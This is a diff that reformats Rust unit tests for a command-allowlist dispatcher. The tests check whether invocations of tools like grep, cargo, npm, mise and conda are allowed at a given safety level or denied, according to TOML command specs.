+    assert_eq!(dispatch_spec(&toks(&["grep", "-rnm", "5", "pattern"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+}
 
-    #[test]
-    fn flat_double_dash_stops_flag_checking() {
-        let spec = load_one(r#"
+#[test]
+fn flat_double_dash_stops_flag_checking() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "grep"
             bare = false
             standalone = ["-r"]
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["grep", "-r", "--", "--not-a-flag", "file"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["grep", "-r", "--", "--not-a-flag", "file"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+}
 
-    #[test]
-    fn flat_max_positional_enforced() {
-        let spec = load_one(r#"
+#[test]
+fn flat_max_positional_enforced() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "uniq"
             bare = true
             max_positional = 1
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["uniq", "a"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-        assert_eq!(
-            dispatch_spec(&toks(&["uniq", "a", "b"]), &spec),
-            Verdict::Denied,
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["uniq", "a"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+    assert_eq!(dispatch_spec(&toks(&["uniq", "a", "b"]), &spec), Verdict::Denied,);
+}
 
-    #[test]
-    fn flat_max_positional_after_double_dash() {
-        let spec = load_one(r#"
+#[test]
+fn flat_max_positional_after_double_dash() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "uniq"
             bare = true
             max_positional = 1
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["uniq", "--", "a", "b"]), &spec),
-            Verdict::Denied,
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["uniq", "--", "a", "b"]), &spec), Verdict::Denied,);
+}
 
-    #[test]
-    fn flat_tolerate_unknown_long() {
-        let spec = load_one(r#"
+#[test]
+fn flat_tolerate_unknown_long() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "echo"
             bare = true
             tolerate_unknown_long = true
             standalone = ["-n", "-e"]
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["echo", "--unknown", "hello"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["echo", "--unknown", "hello"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+}
 
-    #[test]
-    fn legacy_positional_style_is_rejected() {
-        let result = std::panic::catch_unwind(|| {
-            load_one(r#"
+#[test]
+fn legacy_positional_style_is_rejected() {
+    let result = std::panic::catch_unwind(|| {
+        load_one(
+            r#"
                 [[command]]
                 name = "demo-legacy"
                 bare = true
                 positional_style = true
-            "#);
-        });
-        assert!(result.is_err(),
-            "loading positional_style = true should panic with migration guidance");
-    }
+            "#,
+        );
+    });
+    assert!(result.is_err(), "loading positional_style = true should panic with migration guidance");
+}
 
-    #[test]
-    fn flat_level_safe_read() {
-        let spec = load_one(r#"
+#[test]
+fn flat_level_safe_read() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "cargo"
             level = "SafeRead"
             bare = true
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["cargo"]), &spec),
-            Verdict::Allowed(SafetyLevel::SafeRead),
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["cargo"]), &spec), Verdict::Allowed(SafetyLevel::SafeRead),);
+}
 
-    #[test]
-    fn flat_level_safe_write() {
-        let spec = load_one(r#"
+#[test]
+fn flat_level_safe_write() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "cargo"
             level = "SafeWrite"
             bare = true
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["cargo"]), &spec),
-            Verdict::Allowed(SafetyLevel::SafeWrite),
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["cargo"]), &spec), Verdict::Allowed(SafetyLevel::SafeWrite),);
+}
 
-    // Structured commands with subcommands
+// Structured commands with subcommands
 
-    #[test]
-    fn structured_bare_rejected() {
-        let spec = load_one(r#"
+#[test]
+fn structured_bare_rejected() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "cargo"
             bare_flags = ["--help"]
@@ -564,85 +537,77 @@ use super::*;
             [[command.sub]]
             name = "build"
             level = "SafeWrite"
-        "#);
-        assert_eq!(dispatch_spec(&toks(&["cargo"]), &spec), Verdict::Denied);
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["cargo"]), &spec), Verdict::Denied);
+}
 
-    #[test]
-    fn structured_bare_flag() {
-        let spec = load_one(r#"
+#[test]
+fn structured_bare_flag() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "cargo"
             bare_flags = ["--help", "-h"]
 
             [[command.sub]]
             name = "build"
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["cargo", "--help"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["cargo", "--help"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+}
 
-    #[test]
-    fn structured_bare_flag_with_extra_rejected() {
-        let spec = load_one(r#"
+#[test]
+fn structured_bare_flag_with_extra_rejected() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "cargo"
             bare_flags = ["--help"]
 
             [[command.sub]]
             name = "build"
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["cargo", "--help", "extra"]), &spec),
-            Verdict::Denied,
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["cargo", "--help", "extra"]), &spec), Verdict::Denied,);
+}
 
-    #[test]
-    fn structured_help_denied_when_not_in_bare_flags() {
-        let spec = load_one(r#"
+#[test]
+fn structured_help_denied_when_not_in_bare_flags() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "tea"
             bare_flags = ["--version", "-v"]
 
             [[command.sub]]
             name = "whoami"
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["tea", "--help"]), &spec),
-            Verdict::Denied,
-        );
-        assert_eq!(
-            dispatch_spec(&toks(&["tea", "-h"]), &spec),
-            Verdict::Denied,
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["tea", "--help"]), &spec), Verdict::Denied,);
+    assert_eq!(dispatch_spec(&toks(&["tea", "-h"]), &spec), Verdict::Denied,);
+}
 
-    #[test]
-    fn structured_help_allowed_when_in_bare_flags() {
-        let spec = load_one(r#"
+#[test]
+fn structured_help_allowed_when_in_bare_flags() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "cargo"
             bare_flags = ["--help", "-h"]
 
             [[command.sub]]
             name = "build"
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["cargo", "--help"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-        assert_eq!(
-            dispatch_spec(&toks(&["cargo", "-h"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["cargo", "--help"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+    assert_eq!(dispatch_spec(&toks(&["cargo", "-h"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+}
 
-    #[test]
-    fn nested_help_allowed_without_bare_flags() {
-        let spec = load_one(r#"
+#[test]
+fn nested_help_allowed_without_bare_flags() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "tool"
 
@@ -651,20 +616,16 @@ use super::*;
 
             [[command.sub.sub]]
             name = "get"
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["tool", "config", "--help"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-        assert_eq!(
-            dispatch_spec(&toks(&["tool", "config", "-h"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["tool", "config", "--help"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+    assert_eq!(dispatch_spec(&toks(&["tool", "config", "-h"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+}
 
-    #[test]
-    fn nested_help_with_trailing_denied() {
-        let spec = load_one(r#"
+#[test]
+fn nested_help_with_trailing_denied() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "tool"
 
@@ -673,31 +634,29 @@ use super::*;
 
             [[command.sub.sub]]
             name = "get"
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["tool", "config", "--help", "extra"]), &spec),
-            Verdict::Denied,
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["tool", "config", "--help", "extra"]), &spec), Verdict::Denied,);
+}
 
-    #[test]
-    fn structured_unknown_sub_rejected() {
-        let spec = load_one(r#"
+#[test]
+fn structured_unknown_sub_rejected() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "cargo"
 
             [[command.sub]]
             name = "build"
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["cargo", "deploy"]), &spec),
-            Verdict::Denied,
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["cargo", "deploy"]), &spec), Verdict::Denied,);
+}
 
-    #[test]
-    fn structured_sub_policy() {
-        let spec = load_one(r#"
+#[test]
+fn structured_sub_policy() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "cargo"
 
@@ -706,34 +665,32 @@ use super::*;
             level = "SafeRead"
             standalone = ["--release", "-h"]
             valued = ["--jobs", "-j"]
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["cargo", "test", "--release", "-j", "4"]), &spec),
-            Verdict::Allowed(SafetyLevel::SafeRead),
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["cargo", "test", "--release", "-j", "4"]), &spec), Verdict::Allowed(SafetyLevel::SafeRead),);
+}
 
-    #[test]
-    fn structured_sub_unknown_flag_rejected() {
-        let spec = load_one(r#"
+#[test]
+fn structured_sub_unknown_flag_rejected() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "cargo"
 
             [[command.sub]]
             name = "test"
             standalone = ["--release"]
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["cargo", "test", "--evil"]), &spec),
-            Verdict::Denied,
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["cargo", "test", "--evil"]), &spec), Verdict::Denied,);
+}
 
-    // Guarded subcommands
+// Guarded subcommands
 
-    #[test]
-    fn guarded_with_guard() {
-        let spec = load_one(r#"
+#[test]
+fn guarded_with_guard() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "cargo"
 
@@ -741,16 +698,15 @@ use super::*;
             name = "fmt"
             guard = "--check"
             standalone = ["--all", "--check", "-h"]
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["cargo", "fmt", "--check"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["cargo", "fmt", "--check"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+}
 
-    #[test]
-    fn guarded_without_guard_rejected() {
-        let spec = load_one(r#"
+#[test]
+fn guarded_without_guard_rejected() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "cargo"
 
@@ -758,16 +714,15 @@ use super::*;
             name = "fmt"
             guard = "--check"
             standalone = ["--all", "--check"]
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["cargo", "fmt"]), &spec),
-            Verdict::Denied,
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["cargo", "fmt"]), &spec), Verdict::Denied,);
+}
 
-    #[test]
-    fn guarded_with_short_form() {
-        let spec = load_one(r#"
+#[test]
+fn guarded_with_short_form() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "cargo"
 
@@ -776,16 +731,15 @@ use super::*;
             guard = "--list"
             guard_short = "-l"
             standalone = ["--list", "-l"]
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["cargo", "package", "-l"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["cargo", "package", "-l"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+}
 
-    #[test]
-    fn guarded_with_eq_syntax() {
-        let spec = load_one(r#"
+#[test]
+fn guarded_with_eq_syntax() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "tool"
 
@@ -793,16 +747,15 @@ use super::*;
             name = "sub"
             guard = "--mode"
             valued = ["--mode"]
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["tool", "sub", "--mode=check"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["tool", "sub", "--mode=check"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+}
 
-    #[test]
-    fn guarded_short_eq_does_not_satisfy_guard() {
-        let spec = load_one(r#"
+#[test]
+fn guarded_short_eq_does_not_satisfy_guard() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "cargo"
 
@@ -811,16 +764,15 @@ use super::*;
             guard = "--list"
             guard_short = "-l"
             standalone = ["--list", "-l"]
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["cargo", "package", "-l=foo"]), &spec),
-            Verdict::Denied,
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["cargo", "package", "-l=foo"]), &spec), Verdict::Denied,);
+}
 
-    #[test]
-    fn guarded_long_eq_satisfies_guard() {
-        let spec = load_one(r#"
+#[test]
+fn guarded_long_eq_satisfies_guard() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "cargo"
 
@@ -829,16 +781,15 @@ use super::*;
             guard = "--list"
             guard_short = "-l"
             valued = ["--list"]
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["cargo", "package", "--list=all"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["cargo", "package", "--list=all"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+}
 
-    #[test]
-    fn guarded_help_positional_allowed() {
-        let spec = load_one(r#"
+#[test]
+fn guarded_help_positional_allowed() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "cargo"
 
@@ -846,26 +797,19 @@ use super::*;
             name = "fmt"
             guard = "--check"
             standalone = ["--all", "--check"]
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["cargo", "fmt", "--help"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-        assert_eq!(
-            dispatch_spec(&toks(&["cargo", "fmt", "-h"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-        assert_eq!(
-            dispatch_spec(&toks(&["cargo", "fmt", "help"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["cargo", "fmt", "--help"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+    assert_eq!(dispatch_spec(&toks(&["cargo", "fmt", "-h"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+    assert_eq!(dispatch_spec(&toks(&["cargo", "fmt", "help"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+}
 
-    // Nested subcommands
+// Nested subcommands
 
-    #[test]
-    fn nested_sub() {
-        let spec = load_one(r#"
+#[test]
+fn nested_sub() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "mise"
 
@@ -879,20 +823,16 @@ use super::*;
             [[command.sub.sub]]
             name = "list"
             standalone = ["--help", "-h"]
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["mise", "config", "get"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-        assert_eq!(
-            dispatch_spec(&toks(&["mise", "config", "delete"]), &spec),
-            Verdict::Denied,
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["mise", "config", "get"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+    assert_eq!(dispatch_spec(&toks(&["mise", "config", "delete"]), &spec), Verdict::Denied,);
+}
 
-    #[test]
-    fn nested_bare_rejected() {
-        let spec = load_one(r#"
+#[test]
+fn nested_bare_rejected() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "mise"
 
@@ -901,18 +841,17 @@ use super::*;
 
             [[command.sub.sub]]
             name = "get"
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["mise", "config"]), &spec),
-            Verdict::Denied,
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["mise", "config"]), &spec), Verdict::Denied,);
+}
 
-    // Nested with nested_bare = true
+// Nested with nested_bare = true
 
-    #[test]
-    fn nested_bare_allowed_when_flag_set() {
-        let spec = load_one(r#"
+#[test]
+fn nested_bare_allowed_when_flag_set() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "mise"
 
@@ -927,16 +866,15 @@ use super::*;
             [[command.sub.sub]]
             name = "list"
             standalone = ["--help", "-h", "-q", "-v"]
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["mise", "settings"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["mise", "settings"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+}
 
-    #[test]
-    fn nested_bare_help_allowed() {
-        let spec = load_one(r#"
+#[test]
+fn nested_bare_help_allowed() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "mise"
 
@@ -947,20 +885,16 @@ use super::*;
             [[command.sub.sub]]
             name = "get"
             standalone = ["--help", "-h"]
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["mise", "settings", "--help"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-        assert_eq!(
-            dispatch_spec(&toks(&["mise", "settings", "-h"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["mise", "settings", "--help"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+    assert_eq!(dispatch_spec(&toks(&["mise", "settings", "-h"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+}
 
-    #[test]
-    fn nested_bare_still_dispatches_to_subs() {
-        let spec = load_one(r#"
+#[test]
+fn nested_bare_still_dispatches_to_subs() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "mise"
 
@@ -975,24 +909,17 @@ use super::*;
             [[command.sub.sub]]
             name = "list"
             standalone = ["--help", "-h", "-q", "-v"]
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["mise", "settings", "get"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-        assert_eq!(
-            dispatch_spec(&toks(&["mise", "settings", "list"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-        assert_eq!(
-            dispatch_spec(&toks(&["mise", "settings", "get", "-q"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["mise", "settings", "get"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+    assert_eq!(dispatch_spec(&toks(&["mise", "settings", "list"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+    assert_eq!(dispatch_spec(&toks(&["mise", "settings", "get", "-q"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+}
 
-    #[test]
-    fn nested_bare_rejects_unknown_sub() {
-        let spec = load_one(r#"
+#[test]
+fn nested_bare_rejects_unknown_sub() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "mise"
 
@@ -1003,20 +930,16 @@ use super::*;
             [[command.sub.sub]]
             name = "get"
             standalone = ["--help", "-h"]
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["mise", "settings", "set"]), &spec),
-            Verdict::Denied,
-        );
-        assert_eq!(
-            dispatch_spec(&toks(&["mise", "settings", "delete"]), &spec),
-            Verdict::Denied,
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["mise", "settings", "set"]), &spec), Verdict::Denied,);
+    assert_eq!(dispatch_spec(&toks(&["mise", "settings", "delete"]), &spec), Verdict::Denied,);
+}
 
-    #[test]
-    fn nested_bare_rejects_unknown_flags() {
-        let spec = load_one(r#"
+#[test]
+fn nested_bare_rejects_unknown_flags() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "mise"
 
@@ -1027,16 +950,15 @@ use super::*;
             [[command.sub.sub]]
             name = "get"
             standalone = ["--help", "-h"]
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["mise", "settings", "--evil"]), &spec),
-            Verdict::Denied,
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["mise", "settings", "--evil"]), &spec), Verdict::Denied,);
+}
 
-    #[test]
-    fn nested_bare_false_is_default() {
-        let spec = load_one(r#"
+#[test]
+fn nested_bare_false_is_default() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "npm"
 
@@ -1046,40 +968,35 @@ use super::*;
             [[command.sub.sub]]
             name = "get"
             standalone = ["--help", "-h"]
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["npm", "config"]), &spec),
-            Verdict::Denied,
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["npm", "config"]), &spec), Verdict::Denied,);
+}
 
-    // AllowAll
+// AllowAll
 
-    #[test]
-    fn allow_all_accepts_anything() {
-        let spec = load_one(r#"
+#[test]
+fn allow_all_accepts_anything() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "git"
 
             [[command.sub]]
             name = "help"
             allow_all = true
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["git", "help"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-        assert_eq!(
-            dispatch_spec(&toks(&["git", "help", "commit", "--verbose"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["git", "help"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+    assert_eq!(dispatch_spec(&toks(&["git", "help", "commit", "--verbose"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+}
 
-    // FirstArgFilter (first_arg field)
+// FirstArgFilter (first_arg field)
 
-    #[test]
-    fn first_arg_exact_match() {
-        let spec = load_one(r#"
+#[test]
+fn first_arg_exact_match() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "npm"
             bare_flags = ["--help", "--version", "-V", "-h"]
@@ -1088,16 +1005,15 @@ use super::*;
             name = "run"
             first_arg = ["test"]
             level = "SafeRead"
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["npm", "run", "test"]), &spec),
-            Verdict::Allowed(SafetyLevel::SafeRead),
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["npm", "run", "test"]), &spec), Verdict::Allowed(SafetyLevel::SafeRead),);
+}
 
-    #[test]
-    fn first_arg_glob_match() {
-        let spec = load_one(r#"
+#[test]
+fn first_arg_glob_match() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "npm"
 
@@ -1105,20 +1021,16 @@ use super::*;
             name = "run"
             first_arg = ["test", "test:*"]
             level = "SafeRead"
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["npm", "run", "test:unit"]), &spec),
-            Verdict::Allowed(SafetyLevel::SafeRead),
-        );
-        assert_eq!(
-            dispatch_spec(&toks(&["npm", "run", "test:integration"]), &spec),
-            Verdict::Allowed(SafetyLevel::SafeRead),
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["npm", "run", "test:unit"]), &spec), Verdict::Allowed(SafetyLevel::SafeRead),);
+    assert_eq!(dispatch_spec(&toks(&["npm", "run", "test:integration"]), &spec), Verdict::Allowed(SafetyLevel::SafeRead),);
+}
 
-    #[test]
-    fn first_arg_rejects_non_matching() {
-        let spec = load_one(r#"
+#[test]
+fn first_arg_rejects_non_matching() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "npm"
 
@@ -1126,20 +1038,16 @@ use super::*;
             name = "run"
             first_arg = ["test", "test:*"]
             level = "SafeRead"
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["npm", "run", "build"]), &spec),
-            Verdict::Denied,
-        );
-        assert_eq!(
-            dispatch_spec(&toks(&["npm", "run", "start"]), &spec),
-            Verdict::Denied,
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["npm", "run", "build"]), &spec), Verdict::Denied,);
+    assert_eq!(dispatch_spec(&toks(&["npm", "run", "start"]), &spec), Verdict::Denied,);
+}
 
-    #[test]
-    fn first_arg_rejects_bare() {
-        let spec = load_one(r#"
+#[test]
+fn first_arg_rejects_bare() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "npm"
 
@@ -1147,16 +1055,15 @@ use super::*;
             name = "run"
             first_arg = ["test"]
             level = "SafeRead"
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["npm", "run"]), &spec),
-            Verdict::Denied,
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["npm", "run"]), &spec), Verdict::Denied,);
+}
 
-    #[test]
-    fn first_arg_allows_help() {
-        let spec = load_one(r#"
+#[test]
+fn first_arg_allows_help() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "npm"
 
@@ -1164,20 +1071,16 @@ use super::*;
             name = "run"
             first_arg = ["test"]
             level = "SafeRead"
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["npm", "run", "--help"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-        assert_eq!(
-            dispatch_spec(&toks(&["npm", "run", "-h"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["npm", "run", "--help"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+    assert_eq!(dispatch_spec(&toks(&["npm", "run", "-h"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+}
 
-    #[test]
-    fn first_arg_glob_does_not_match_partial() {
-        let spec = load_one(r#"
+#[test]
+fn first_arg_glob_does_not_match_partial() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "npm"
 
@@ -1185,22 +1088,18 @@ use super::*;
             name = "run"
             first_arg = ["test:*"]
             level = "SafeRead"
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["npm", "run", "test"]), &spec),
-            Verdict::Denied,
-        );
-        assert_eq!(
-            dispatch_spec(&toks(&["npm", "run", "testing"]), &spec),
-            Verdict::Denied,
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["npm", "run", "test"]), &spec), Verdict::Denied,);
+    assert_eq!(dispatch_spec(&toks(&["npm", "run", "testing"]), &spec), Verdict::Denied,);
+}
 
-    // RequireAny
+// RequireAny
 
-    #[test]
-    fn require_any_with_required_flag() {
-        let spec = load_one(r#"
+#[test]
+fn require_any_with_required_flag() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "conda"
             bare_flags = ["--help", "--version", "-V", "-h"]
@@ -1211,24 +1110,17 @@ use super::*;
             require_any = ["--show", "--show-sources"]
             standalone = ["--help", "--json", "--quiet", "--show", "--show-sources", "--verbose", "-h", "-q", "-v"]
             valued = ["--env", "--file", "--name", "--prefix", "-f", "-n", "-p"]
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["conda", "config", "--show"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-        assert_eq!(
-            dispatch_spec(&toks(&["conda", "config", "--show-sources"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-        assert_eq!(
-            dispatch_spec(&toks(&["conda", "config", "--show", "--json"]), &spec),
-            Verdict::Allowed(SafetyLevel::Inert),
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["conda", "config", "--show"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+    assert_eq!(dispatch_spec(&toks(&["conda", "config", "--show-sources"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+    assert_eq!(dispatch_spec(&toks(&["conda", "config", "--show", "--json"]), &spec), Verdict::Allowed(SafetyLevel::Inert),);
+}
 
-    #[test]
-    fn require_any_without_required_flag() {
-        let spec = load_one(r#"
+#[test]
+fn require_any_without_required_flag() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "conda"
 
@@ -1237,20 +1129,16 @@ use super::*;
             bare = false
             require_any = ["--show", "--show-sources"]
             standalone = ["--help", "--json", "--show", "--show-sources", "-h"]
-        "#);
-        assert_eq!(
-            dispatch_spec(&toks(&["conda", "config", "--json"]), &spec),
-            Verdict::Denied,
-        );
-        assert_eq!(
-            dispatch_spec(&toks(&["conda", "config"]), &spec),
-            Verdict::Denied,
-        );
-    }
+        "#,
+    );
+    assert_eq!(dispatch_spec(&toks(&["conda", "config", "--json"]), &spec), Verdict::Denied,);
+    assert_eq!(dispatch_spec(&toks(&["conda", "config"]), &spec), Verdict::Denied,);
+}
 
-    #[test]
-    fn require_any_allows_help() {
-        let spec = load_one(r#"
+#[test]
+fn require_any_allows_help() {
+    let spec = load_one(
+        r#"
             [[command]]
             name = "conda"
 
@@ -1259,20 +1147,16 @@ use super::*;
             bare = false
